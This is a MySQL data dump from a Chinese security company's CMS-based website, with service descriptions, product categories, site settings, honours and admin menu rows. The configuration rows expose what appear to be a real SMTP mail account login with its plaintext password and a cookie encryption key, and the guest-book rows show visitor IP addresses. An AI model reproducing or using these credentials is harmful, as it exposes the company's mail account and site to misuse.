INSERT INTO `xyh_category` VALUES ('89','等级保护咨询服务','ConsultingService','/public/home/default/img/server/05.png','5','35','0','','','海峡信息等保咨询服务从安全管理和安全技术两大方面的十个控制类中进行等级保护建设和整改咨询服务，海峡信息把等级保护建设过程分解为4个子服务：等级保护建设差距分析服务、等级保护安全整改与加固服务阶段、等级保护测评辅助服务阶段、等级保护管理体系建设服务阶段','','List_service.html','Show_article.html','<p>等级保护制度是我国信息安全保障体系的基本制度，2007年公安部等四部委联合发布了《关于开展全国重要信息系统安全等级保护定级工作的通知》（公信安［2007］861号），明确了重要信息系统等级保护工作的开展。</p><p>客户需求</p><p>1、政策需求——符合等级保护的要求</p><p>--完成系统定级并备案</p><p>--系统达到《基本要求》相应级别的指标</p><p>--符合《测评准则》要求，并通过测评</p><p>2、实际需求——满足安全实际要求</p><p>--融合现有的安全体系或安全设施</p><p>--满足客户的其他符合性要求，如行业标准等</p><p>--适应业务特征与安全要求的差异性</p><p>--整体考虑，统一建设与管理</p><p>--建立长效机制，可持续运行、发展和完善</p><p>服务介绍</p><p>海峡信息等保咨询服务从安全管理和安全技术两大方面的十个控制类中进行等级保护建设和整改咨询服务，海峡信息把等级保护建设过程分解为4个子服务:</p><p>（1）等级保护建设差距分析服务</p><p>等级保护建设项目首先要进行重要信息系统的定级和备案工作。然后针对定级备案系统所在的网络环境开展资产整理、风险评估、渗透测试等工作，以分析信息系统当前风险状况，以明确等级保护整改需求和重点。差距分析服务会输出等级保护需求分析、方案设计、项目规划、安全措施选择与选型等内容，等级保护差距分析服务是等级保护整改与加固的基础，也可以单独购买。</p><p>（2）等级保护安全整改与加固服务阶段</p><p>等级保护安全加固服务包括重要信息系统相关的网络结构化设计，网络设备安全防护加固，服务器主机安全加固，数据库系统安全加固，中间件系统安全加固，应用服务漏洞检测与加固服务等加固工作。安全加固服务能够有效的加强等级保护的网络安全设备防护、主机安全的大部分控制点以及应用安全漏洞修复方面起到重要作用。</p><p>（3）等级保护测评辅助服务阶段</p><p>重要信息系统整改完毕后，执行一次完整的等级保护差距复查服务，按照等级保护基本要求和等级保护测评准则实施自我预测评工作，并根据测评结果弥补缺漏，为申请测评做准备。测评辅助服务还包括在等级保护测评前，海峡信息协助用户完成等级保护的重要信息系统的定级和备案工作。在等级保护测评过程中，海峡信息协助用户为测评机构提供测评数据，辅助测评工作的顺利开展。</p><p>（4）等级保护管理体系建设服务阶段</p><p>根据等级保护安全管理基本要求，为重要信息系统建立起信息安全策略、方针、各项安全管理制度、安全操作规范以及各类操作记录文档体系，使信息化管理能够在等级保护要求的管理体系下长期稳定运行。</p><p>以上4个服务包构成海峡信息等级保护咨询一站式服务，也可以根据实际情况选用。海峡信息一站式安全服务如下图所示：</p><p><img src=\"http://www.fjssc.cn/uploads/allimg/130922/1-13092211140R35.PNG\"/></p><p>为什么选择海峡信息</p><p>(1)丰富的经验：海峡信息作为福建省唯一以信息安全为主营业务的企业，参与大量等级保护相关研究和实践工作；</p><p>（2）专业的团队：经验丰富的专业服务人员，规范化的服务交付能力；</p><p>（3）深厚的资质：福建省卫生行业信息安全等级保护专家组中唯一的一个企业化单位。</p><p>典型案例</p><p>已经通过等级保护测评的客户信息系统：</p><p>科技厅科技项目管理系统</p><p>台湾文献信息系统</p><p>农业厅外网网站系统、五有系统</p><p>公务员局公务员招考系统</p><p>福州海关运行网信息系统</p><p>服务中的三级系统</p><p>政务外网云计算平台</p><p>福建省附属第一医院信息系统</p><p>福建省中山医院信息系统</p><p>福建省财政厅</p><p>福建省立医院</p><p>龙岩市第一医院</p><p>厦门大学附属第一医院</p><p>福建协和医院</p>','1','5','/public/home/default/img/server/05.png');
INSERT INTO `xyh_category` VALUES ('86','安全运维外包','Outsource','/public/home/default/img/server/03.png','5','35','0','','','海峡信息构建了专业的信息安全运营服务团队，凭借丰富的攻防经验和规范化的服务水平，依托强大的安全服务支撑平台，为客户提供“安全运维服务”。海峡信息“安全运维服务（SI-MSS）”，以现场为主，远程为辅，采用主动预防的方式，面向各级政府数据中心、云计算数据中心、政府网站群、企业数据中心等提供安全运维服务。为用户提供专业安全保障，降低信息安全投入成本，使用户专注于自己的核心业务，提高本单位的综合竞争力，提升客户在安全方面的投入','','List_service.html','Show_article.html','<p>不松懈，时刻警惕。——弗兰西斯，培根</p><p>只有业余分子才会攻击机器，专业人士针对的目标是人——Bruce Schneier</p><p>近年来，新技术浪潮接踵而至，黑客攻击手法也与时俱进。0day攻击、APT攻击让传统的安全设备防护模式捉襟见肘。海峡信息认为在新形势下的安全对抗，不能让缺乏智慧的安全设备与拥有智慧的“骇客”单独对抗，而应该在安全专业团队的参与下来打赢这场信息安全保卫战。</p><p>客户需求</p><p>（1）我们单位的网络安全的短板在哪儿？</p><p>（2）我们单位买了很多安全产品，现在要怎么用比较合理？</p><p>（3）我们单位买了一堆安全产品，可是还是出了安全问题，有点没招了！</p><p>（4）数据中心安全运维怎么形成安全运维体系化、专业化以保障整体安全？</p><p>服务介绍</p><p>海峡信息构建了专业的信息安全运营服务团队，凭借丰富的攻防经验和规范化的服务水平，依托强大的安全服务支撑平台，为客户提供“安全运维服务”（Managed Security Services Provider，SI-MSS）。海峡信息“安全运维服务（SI-MSS）”，以现场为主，远程为辅，采用主动预防的方式，面向各级政府数据中心、云计算数据中心、政府网站群、企业数据中心等提供安全运维服务。为用户提供专业安全保障，降低信息安全投入成本，使用户专注于自己的核心业务，提高本单位的综合竞争力，提升客户在安全方面的投入产出比。</p><p>体系结构图如下所示：</p><p><img src=\"http://www.fjssc.cn/uploads/allimg/130926/1-130926111222294.png\"/></p><p>海峡信息SI-MSS安全运维提供定期对网络设备、安全设备、主机系统进行安全巡检，及时修补信息系统中被发现的安全漏洞和隐患并针对所发现的漏洞和隐患进行安全加固和优化；当设备出现异常或者病毒、黑客入侵时，提供应急预案进行处理，确保在最短时间内处理事件、及时补救、消除隐患。并根据当前的安全形势动态调整安全策略，以提高信息系统的安全性。安全运维流程如下图所示：</p><p>客户价值</p><p>为企业面向互联网的信息网络提供安全保障业务，降低企业信息安全投入成本，使企业专注于自己的核心业务，提高企业的综合竞争力，提升客户在安全方面的投入产出比。</p>','1','3','/public/home/default/img/server/03.png');
INSERT INTO `xyh_category` VALUES ('87','风险评估与规划','EvaluationAndPlanning','/public/home/default/img/server/04.png','5','35','0','','','信息安全风险评估是一个识别、控制、降低或消除可能影响信息系统的安全风险的过程。海峡信息遵照国家《信息安全风险评估规范》(GB/T 20984-2007)及等级保护系列规范，遵循ISO27001以及相关行业规范，从安全技术和安全管理两个层面入手，全面深入分析信息系统存在的脆弱性、威胁和风险，输出风险评估报告和风险处置建议。并进一步协助用户完成安全规划，有步骤有计划的提升用户的信息安全保障水平。海峡信息风险评估服务根据服务内容不同，可以分解为网络安全评估、网站安全评估、应用系统安全评估等多种类型。','','List_service.html','Show_article.html','<p>Microsoft把有效的安全措施整合为标准，但是高超的应对手法层出不穷。安全系统存在一个适得其反的坏毛病，无疑会引发重大问题——Rick Maybury</p><p>信息系统存在的脆弱性是不可避免的，经过几十年的研究，大家发现这是由于人为的错误所造成的，对于现在我们所使用的一个庞大的、复杂的技术系统来说，恐怕在长时间内是不可避免的。因此，在现实环境中，人们总是要面临着各种各样的威胁，或者是信息安全风险是必然的。在这种情况下，通过适当的、足够的，有时候是综合的安全措施来控制风险，最终目的是使残余下来的风险可以降低到最低程度。任何信息系统都会有安全风险，所以，人们追求的所谓安全的信息系统，实际是指信息系统在实施了风险评估并做出风险控制后，仍然存在的残余风险可被接受的信息系统。</p><p>信息安全风险评估是一个识别、控制、降低或消除可能影响信息系统的安全风险的过程。海峡信息遵照国家《信息安全风险评估规范》（GB/T 20984-2007）及等级保护系列规范，遵循ISO27001以及相关行业规范，从安全技术和安全管理两个层面入手，全面深入分析信息系统存在的脆弱性、威胁和风险，输出风险评估报告和风险处置建议。并进一步协助用户完成安全规划，有步骤有计划的提升用户的信息安全保障水平。海峡信息风险评估服务根据服务内容不同，可以分解为网络安全评估、网站安全评估、应用系统安全评估等多种类型。</p><p>风险评估服务流程图如下所示：</p><p><img src=\"http://www.fjssc.cn/uploads/allimg/130926/1-1309261114592J.png\"/></p><p>海峡信息风险评估服务具体内容如下图所示：</p><p><img src=\"http://www.fjssc.cn/uploads/allimg/130926/1-130926111531H9.png\"/></p><p>客户价值</p><p>（1）认识风险及其对目标的潜在影响；</p><p>（2）为决策者提供信息；</p><p>（3）有助于认识风险，以便帮助选择应对策略；</p><p>（4）识别那些造成风险的主要因素，揭示系统和组织的薄弱环节；</p><p>（5）有助于明确需要优先处理的风险事件；</p><p>（6）有助于通过事后调查来进行事故预防；</p><p>（7）有助于风险应对策略的选择；</p><p>（8）满足监管要求。</p>','1','4','/public/home/default/img/server/04.png');
INSERT INTO `xyh_category` VALUES ('41','安全公告','Announcement','/public/home/default/img/server/Announcement.png','5','1','0','','','','','List_article.html','Show_article.html','','1','11','/public/home/default/img/server/04.png');
INSERT INTO `xyh_category` VALUES ('100','黑盾安全威胁检测与防御系统 &lt;APT&gt;','apt','/public/home/default/img/product/apt.png','2','3','0','','','','','List_product.html','Show_product.html','','1','16','');
INSERT INTO `xyh_category` VALUES ('101','多网隔离应用接入平台','duowanggeliyingyongjierupingtai','/public/home/default/img/product/duowanggeli.png','2','3','0','','','','','List_product.html','Show_product.html','','1','17','');


# 转存表中的数据：xyh_category_access 


# 转存表中的数据：xyh_comment 


# 转存表中的数据：xyh_config 
INSERT INTO `xyh_config` VALUES ('1','CFG_WEBNAME','网站名称','','','2','1','福建省海峡信息技术有限公司','0');
INSERT INTO `xyh_config` VALUES ('2','CFG_WEBURL','网站域名','','','2','1','/','0');
INSERT INTO `xyh_config` VALUES ('3','CFG_WEBTITLE','网站标题','站点首页title(SEO)的设置','','2','1','福建省海峡信息技术有限公司 - 黑盾，安全缔造信息未来','0');
INSERT INTO `xyh_config` VALUES ('4','CFG_KEYWORDS','站点关键词','','','2','1','黑盾,网络安全公司,海峡,防火墙,数据库审计,入侵防御,入侵防护,远程安全评估,web安全防护,安全准入,文档安全','0');
INSERT INTO `xyh_config` VALUES ('5','CFG_DESCRIPTION','站点描述','','','3','1','福建省海峡信息技术有限公司，是一家专业从事网络安全技术研发、网络安全产品销售、网络安全服务的高薪技术企业','0');
INSERT INTO `xyh_config` VALUES ('6','CFG_THEMESTYLE','模板风格','','select','2','1','default','0');
INSERT INTO `xyh_config` VALUES ('7','CFG_COOKIE_ENCODE','cookie加密码','','','2','1','lj4YBfzCU','0');
INSERT INTO `xyh_config` VALUES ('8','CFG_POWERBY','网站版权信息','','','3','1','© 1999-2017 Fujian Strait Information Corporation. All Rights Reserved.','0');
INSERT INTO `xyh_config` VALUES ('9','CFG_STATS','网站统计','','','3','1','','0');
INSERT INTO `xyh_config` VALUES ('10','CFG_BEIAN','网站备案号','','','2','1','闽ICP备06011901号','0');
INSERT INTO `xyh_config` VALUES ('11','CFG_ADDRESS','联系地址','','','2','1','福建省福州市北环中路61号海峡信息大楼2F','0');
INSERT INTO `xyh_config` VALUES ('12','CFG_PHONE','联系电话','','','2','1','400-6353-500','0');
INSERT INTO `xyh_config` VALUES ('13','CFG_WEBSITE_CLOSE','关闭网站','','','4','2','0','0');
INSERT INTO `xyh_config` VALUES ('14','CFG_WEBSITE_CLOSE_INFO','关站提示','','','3','2','站点维护中，请稍等一会...','0');
INSERT INTO `xyh_config` VALUES ('15','CFG_MOBILE_AUTO','手机版开启','','','4','2','1','1');
INSERT INTO `xyh_config` VALUES ('16','CFG_EMAIL_FROM','发件邮箱地址','','','2','3','hxzhb@heidun.net','0');
INSERT INTO `xyh_config` VALUES ('17','CFG_EMAIL_FROM_NAME','发件人名称','','','2','3','福建省海峡信息技术有限公司','0');
INSERT INTO `xyh_config` VALUES ('18','CFG_EMAIL_HOST','STMP服务器','','','2','3','smtp.exmail.qq.com','0');
INSERT INTO `xyh_config` VALUES ('19','CFG_EMAIL_PORT','服务器端口','','','1','3','25','0');
INSERT INTO `xyh_config` VALUES ('20','CFG_EMAIL_LOGINNAME','邮箱帐号','','','2','3','hxzhb@heidun.net','0');
INSERT INTO `xyh_config` VALUES ('21','CFG_EMAIL_PASSWORD','邮箱密码','','','2','3','123zstQhz4','0');
INSERT INTO `xyh_config` VALUES ('22','CFG_BADWORD','禁用词语','','','3','2','一中一台|中华民国|中港|中台|台湾行政院|台湾立法院|台湾检察院|福尔摩沙|世维|疆独|藏独|台独|赌博|博彩|风水|算命|算卦|看相|占卜|八字|吉凶查询|姓名测试|姓名解析|摸骨|称骨|开光|法事|超度|辟邪|镇宅|驱魔|性病|性生活|性功能|性高潮|性爱|裸聊|催情|迷情|情色|情欲|人体透视镜|成人用药|伟哥|神油|壮阳|阳具|自慰|跳蛋|按摩棒|G点|男根|女性自用|债务清欠|私人调查|婚姻调查|证据搜集|侦探|万能钥匙|麻醉专用药|汽车解码器','0');
INSERT INTO `xyh_config` VALUES ('23','CFG_FEEDBACK_GUEST','允许匿名评论','','','4','2','1','0');
INSERT INTO `xyh_config` VALUES ('24','CFG_MEMBER_OPEN','开启会员功能','','','4','5','1','0');
INSERT INTO `xyh_config` VALUES ('25','CFG_MEMBER_VERIFYEMAIL',' 开启邮件验证','','','4','5','0','0');
INSERT INTO `xyh_config` VALUES ('26','CFG_MEMBER_NOTALLOW','禁止使用的昵称','','','3','5','www,bbs,ftp,mail,user,users,admin,administrator,xyhcms','0');
INSERT INTO `xyh_config` VALUES ('27','CFG_UPLOAD_MAXSIZE','允许上传大小','KB','','1','4','2048','0');
INSERT INTO `xyh_config` VALUES ('28','CFG_IMGTHUMB_SIZE','缩略图组尺寸','','','2','4','300X300','0');
INSERT INTO `xyh_config` VALUES ('29','CFG_IMGTHUMB_TYPE','缩略图生成方式','固定大小截取 ,原图等比例缩略','radio\r\n0|原图等比例缩略\r\n1|固定大小截取','4','4','0','0');
INSERT INTO `xyh_config` VALUES ('30','CFG_IMGTHUMB_WIDTH','固宽缩略图组长度','固定宽度等比缩略,如60,50','','2','4','600','0');
INSERT INTO `xyh_config` VALUES ('31','CFG_UPLOAD_ROOTPATH','上传根目录','','','2','4','./uploads/','0');
INSERT INTO `xyh_config` VALUES ('32','CFG_UPLOAD_FILE_EXT','允许附件类型','','','3','4','jpg,gif,png,jpeg,txt,doc,docx,xls,ppt,zip,rar,mp3','0');
INSERT INTO `xyh_config` VALUES ('33','CFG_UPLOAD_IMG_EXT','允许图片类型','带缩略图的图片','','2','4','jpg,gif,png,jpeg','0');
INSERT INTO `xyh_config` VALUES ('34','CFG_VERIFY_REGISTER','开启注册验证码','','','4','2','0','0');
INSERT INTO `xyh_config` VALUES ('35','CFG_VERIFY_LOGIN','开启登录验证码','','','4','2','0','0');
INSERT INTO `xyh_config` VALUES ('36','CFG_VERIFY_GUESTBOOK','开启留言板验证码','','','4','2','1','0');
INSERT INTO `xyh_config` VALUES ('37','CFG_VERIFY_REVIEW','开启评论验证码','','','4','2','1','0');
INSERT INTO `xyh_config` VALUES ('38','CFG_SQL_FILESIZE','sql文件大小','备份数据库，值不可太大，否则会导致内存溢出备份、恢复失败，合理大小在512K~10M间，建议3M一卷。单位字节,5M=5*1024*1024=5242880','','1','6','5242880','0');
INSERT INTO `xyh_config` VALUES ('39','CFG_DOWNLOAD_HIDE','隐藏下载地址','','','4','4','0','0');
INSERT INTO `xyh_config` VALUES ('40','CFG_MOBILE_THEMESTYLE','手机模板风格','','select','2','2','default','1');


# 转存表中的数据：xyh_culture 
INSERT INTO `xyh_culture` VALUES ('25','炮阵啊，大家在照谁?','炮阵啊，大家在照谁?','/uploads/img1/20170629/5954c1ec299cf.jpg');
INSERT INTO `xyh_culture` VALUES ('24','传扬龙的精神：）','传扬龙的精神：）','/uploads/img1/20170629/5954c1e426b57.jpg');
INSERT INTO `xyh_culture` VALUES ('26','我也想这样惬意！','我也想这样惬意！','/uploads/img1/20170629/5954c1f95d81b.jpg');
INSERT INTO `xyh_culture` VALUES ('27','站在巨人肩上的人','站在巨人肩上的人','/uploads/img1/20170629/5954c2036b52b.jpg');
INSERT INTO `xyh_culture` VALUES ('28','那天、那石、那人','那天、那石、那人','/uploads/img1/20170629/5954c20de640c.jpg');
INSERT INTO `xyh_culture` VALUES ('29','潮起潮落，欢呼依旧','潮起潮落，欢呼依旧','/uploads/img1/20170629/5954c21ed0df9.jpg');
INSERT INTO `xyh_culture` VALUES ('30',' 江山如画，兴趣盎然',' 江山如画，兴趣盎然','/uploads/img1/20170630/5955a366c6c51.JPG');
INSERT INTO `xyh_culture` VALUES ('31','傲然铮骨，山之瑰丽','傲然铮骨，山之瑰丽','/uploads/img1/20170630/5955a37768b80.JPG');


# 转存表中的数据：xyh_guestbook 
INSERT INTO `xyh_guestbook` VALUES ('1','小平','','','','','112.115.215.93','1396244141','1396338235','1','网站不错，很喜欢！！！','谢谢支持！','0');
INSERT INTO `xyh_guestbook` VALUES ('2','明明','','','','','112.115.192.30','1396337906','0','1','蓝色很大气，模板很好看！','','0');


# 转存表中的数据：xyh_honor 
INSERT INTO `xyh_honor` VALUES ('8','专家工作站','/uploads/img1/20170702/5958b226b82f3.jpg!300X300.jpg');
INSERT INTO `xyh_honor` VALUES ('5','商用密码产品生产定点单位证书','/uploads/img1/20170701/59574d3a6fc0c.jpg!300X300.jpg');
INSERT INTO `xyh_honor` VALUES ('10','信息安全等级保护安全建设服务机构能力评估合格证书','/uploads/img1/20170701/59574d44ca795.jpg!300X300.jpg');
INSERT INTO `xyh_honor` VALUES ('7','软件企业认定证书','/uploads/img1/20170701/59574d2a9947a.jpg!300X300.jpg');
INSERT INTO `xyh_honor` VALUES ('9','ISO27001信息安全管理体系认证证书','/uploads/img1/20170701/59574c2917380.jpg!300X300.jpg');
INSERT INTO `xyh_honor` VALUES ('11','ISO9001质量管理体系认证证书','/uploads/img1/20170701/59574c8fabde5.jpg!300X300.jpg');
INSERT INTO `xyh_honor` VALUES ('33','国家信息安全服务（安全工程）2级认证证书','/uploads/img1/20170701/59574ccf60190.jpg!300X300.jpg');
INSERT INTO `xyh_honor` VALUES ('3','福建省创新型企业认证证书','/uploads/img1/20170701/59574ce1970a3.jpg!300X300.jpg');
INSERT INTO `xyh_honor` VALUES ('4','福建省软件技术研发中心','/uploads/img1/20170701/59574cfa0e2c8.jpg!300X300.jpg');
INSERT INTO `xyh_honor` VALUES ('6','福建省网络与信息安全应急技术支撑单位2016','/uploads/img1/20170701/59574d06dda0f.jpg!300X300.jpg');
INSERT INTO `xyh_honor` VALUES ('1','高新企业技术证书','/uploads/img1/20170701/59574d13d255c.jpg!300X300.jpg');
INSERT INTO `xyh_honor` VALUES ('2','福建省信息网络安全工程技术研究中心','/uploads/img1/20170701/59574d2031216.jpg!300X300.jpg');


# 转存表中的数据：xyh_itemgroup 
INSERT INTO `xyh_itemgroup` VALUES ('1','flagtype','文档属性','0');
INSERT INTO `xyh_itemgroup` VALUES ('2','blocktype','自由块类别','0');
INSERT INTO `xyh_itemgroup` VALUES ('3','softtype','软件类型','0');
INSERT INTO `xyh_itemgroup` VALUES ('4','softlanguage','软件语言','0');
INSERT INTO `xyh_itemgroup` VALUES ('5','star','星座','0');
INSERT INTO `xyh_itemgroup` VALUES ('6','animal','生肖','0');
INSERT INTO `xyh_itemgroup` VALUES ('7','education','教育程度','0');
INSERT INTO `xyh_itemgroup` VALUES ('8','configgroup','配置分组','0');
INSERT INTO `xyh_itemgroup` VALUES ('9','configtype','配置变量类型','0');


# 转存表中的数据：xyh_iteminfo 
INSERT INTO `xyh_iteminfo` VALUES ('1','图片','flagtype','1','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('2','头条','flagtype','2','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('3','推荐','flagtype','4','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('4','特荐','flagtype','8','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('5','幻灯','flagtype','16','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('6','跳转','flagtype','32','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('7','其他','flagtype','64','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('8','文字','blocktype','1','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('9','图片','blocktype','2','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('10','丰富','blocktype','3','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('11','国产','softtype','1','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('12','中文版','softlanguage','1','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('13','英文版','softlanguage','2','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('14','多语言版','softlanguage','3','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('15','白羊座','star','1','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('16','金牛座','star','2','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('17','双子座','star','3','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('18','巨蟹座','star','4','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('19','狮子座','star','5','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('20','处女座','star','6','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('21','天枰座','star','7','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('22','天蝎座','star','8','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('23','射手座','star','9','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('24','摩羯座','star','10','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('25','水瓶座','star','11','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('26','双鱼座','star','12','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('27','鼠','animal','1','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('28','牛','animal','2','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('29','虎','animal','3','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('30','兔','animal','4','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('31','龙','animal','5','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('32','蛇','animal','6','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('33','马','animal','7','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('34','羊','animal','8','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('35','猴','animal','9','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('36','鸡','animal','10','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('37','狗','animal','11','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('38','猪','animal','12','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('39','小学','education','1','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('40','初中','education','2','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('41','高中/中专','education','3','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('42','大学专科','education','4','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('43','大学本科','education','5','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('44','硕士','education','6','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('45','博士以上','education','7','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('46','站点配置','configgroup','1','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('47','核心配置','configgroup','2','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('48','邮箱配置','configgroup','3','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('49','上传配置','configgroup','4','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('50','会员配置','configgroup','5','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('51','其他配置','configgroup','6','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('52','数字','configtype','1','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('53','字符','configtype','2','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('54','文本','configtype','3','0','0');
INSERT INTO `xyh_iteminfo` VALUES ('55','布尔(真假)','configtype','4','0','0');


# 转存表中的数据：xyh_link 
INSERT INTO `xyh_link` VALUES ('5','福建科学技术信息研究所','http://www.fjinfo.org.cn/','','','0','1492433523','2');
INSERT INTO `xyh_link` VALUES ('4','福建省信息网络重点实验室','http://www.fjlab.org.cn/showIndexPage.do','','','0','1492433482','4');
INSERT INTO `xyh_link` VALUES ('6','福建省生产力促进中心','http://www.fjppc.org.cn/','','','0','1492433548','3');
INSERT INTO `xyh_link` VALUES ('8','福建科技厅','http://www.fjkjt.gov.cn/','','','0','1492433656','1');


# 转存表中的数据：xyh_member 


# 转存表中的数据：xyh_memberdetail 


# 转存表中的数据：xyh_membergroup 
INSERT INTO `xyh_membergroup` VALUES ('1','游客','','0','0','0');
INSERT INTO `xyh_membergroup` VALUES ('2','注册会员','','10','0','0');
INSERT INTO `xyh_membergroup` VALUES ('3','中级会员','','30','0','0');


# 转存表中的数据：xyh_menu 
INSERT INTO `xyh_menu` VALUES ('1','常规管理','0','','','','0','1','1');
INSERT INTO `xyh_menu` VALUES ('2','模块管理','0','','','','0','0','2');
INSERT INTO `xyh_menu` VALUES ('3','系统设置','0','','','','0','1','3');
INSERT INTO `xyh_menu` VALUES ('4','扩展管理','0','','','','0','0','4');
INSERT INTO `xyh_menu` VALUES ('5','导航菜单管理','1','','','','0','1','11');
INSERT INTO `xyh_menu` VALUES ('6','内容管理','1','','','','0','1','12');
INSERT INTO `xyh_menu` VALUES ('7','常用操作','1','','','','0','1','13');
INSERT INTO `xyh_menu` VALUES ('8','导航菜单','5','Category','index','','0','1','111');
INSERT INTO `xyh_menu` VALUES ('9','内置模块','2','','','','0','1','21');
INSERT INTO `xyh_menu` VALUES ('10','自由块管理','9','Block','index','','0','1','211');
INSERT INTO `xyh_menu` VALUES ('12','专题管理','9','Special','index','','0','1','213');
INSERT INTO `xyh_menu` VALUES ('14','友情链接','9','Link','index','','1','1','215');
INSERT INTO `xyh_menu` VALUES ('15','留言本管理','9','Guestbook','index','','1','1','216');
INSERT INTO `xyh_menu` VALUES ('16','评论管理','9','Comment','index','','1','1','217');
INSERT INTO `xyh_menu` VALUES ('17','网站相关','3','','','','0','1','31');
INSERT INTO `xyh_menu` VALUES ('18','会员相关','3','','','','0','0','33');
INSERT INTO `xyh_menu` VALUES ('19','管理员相关','3','','','','0','1','34');
INSERT INTO `xyh_menu` VALUES ('20','网站设置','17','System','site','','1','1','311');
INSERT INTO `xyh_menu` VALUES ('21','伪静态|缓存设置','24','System','url','','0','1','312');
INSERT INTO `xyh_menu` VALUES ('22','清除缓存','24','System','clearCache','','1','1','316');
INSERT INTO `xyh_menu` VALUES ('23','在线客服设置','17','System','online','','0','1','313');
INSERT INTO `xyh_menu` VALUES ('24','缓存相关','3','','','','0','1','32');
INSERT INTO `xyh_menu` VALUES ('25','一键更新全站','24','ClearHtml','all','','0','1','321');
INSERT INTO `xyh_menu` VALUES ('26','更新首页','24','ClearHtml','home','','0','1','322');
INSERT INTO `xyh_menu` VALUES ('27','更新栏目','24','ClearHtml','lists','','0','1','323');
INSERT INTO `xyh_menu` VALUES ('28','更新内容','24','ClearHtml','shows','','0','1','324');
INSERT INTO `xyh_menu` VALUES ('29','更新专题','24','ClearHtml','special','','0','0','325');
INSERT INTO `xyh_menu` VALUES ('30','会员管理','18','Member','index','','0','1','331');
INSERT INTO `xyh_menu` VALUES ('31','会员组管理','18','Membergroup','index','','0','1','332');
INSERT INTO `xyh_menu` VALUES ('32','系统用户管理','19','Rbac','index','','0','1','341');
INSERT INTO `xyh_menu` VALUES ('33','用户组设置','19','Rbac','role','','0','1','342');
INSERT INTO `xyh_menu` VALUES ('34','操作权限列表','19','Rbac','node','','0','1','343');
INSERT INTO `xyh_menu` VALUES ('35','扩展管理','4','','','','0','1','41');
INSERT INTO `xyh_menu` VALUES ('36','管理员账户','1','','','','0','1','42');
INSERT INTO `xyh_menu` VALUES ('37','模型控制器','35','Model','index','','0','1','411');
INSERT INTO `xyh_menu` VALUES ('38','系统菜单','17','Menu','index','','0','1','413');
INSERT INTO `xyh_menu` VALUES ('39','数据库管理','48','Database','index','','0','1','414');
INSERT INTO `xyh_menu` VALUES ('40','联动管理','35','Itemgroup','index','','0','1','415');
INSERT INTO `xyh_menu` VALUES ('41','区域管理','35','Area','index','','0','1','416');
INSERT INTO `xyh_menu` VALUES ('42','修改我的信息','36','Personal','index','','0','1','421');
INSERT INTO `xyh_menu` VALUES ('43','修改密码','36','Personal','pwd','','0','1','422');
INSERT INTO `xyh_menu` VALUES ('44','其他模块','2','','','','0','1','22');
INSERT INTO `xyh_menu` VALUES ('45','已上传文件管理','48','Attachment','index','','0','1','418');
INSERT INTO `xyh_menu` VALUES ('46','数据元管理','35','Meta','index','','0','1','417');
INSERT INTO `xyh_menu` VALUES ('47','视图模板','35','Templets','index','','0','1','412');
INSERT INTO `xyh_menu` VALUES ('48','数据库&文件相关','3','','','','0','1','420');


# 转存表中的数据：xyh_meta 
INSERT INTO `xyh_meta` VALUES ('1','1','HOME_URL_MODEL','2');
INSERT INTO `xyh_meta` VALUES ('2','1','HOME_URL_PATHINFO_DEPR','/');
INSERT INTO `xyh_meta` VALUES ('3','1','HOME_URL_ROUTER_ON','0');
INSERT INTO `xyh_meta` VALUES ('4','1','HOME_URL_ROUTE_RULES','Mobile$=>Mobile/Index/index\r\nSpecial/:id\\d=>Special/shows\r\n:e/p/:p\\d=>List/index\r\n:e/:id\\d=>Show/index\r\n/^(\\w+)$/=>List/index?e=:1');
INSERT INTO `xyh_meta` VALUES ('5','1','HOME_HTML_CACHE_ON','0');
INSERT INTO `xyh_meta` VALUES ('6','1','MOBILE_HTML_CACHE_ON','0');
INSERT INTO `xyh_meta` VALUES ('7','1','HTML_CACHE_INDEX_ON','0');
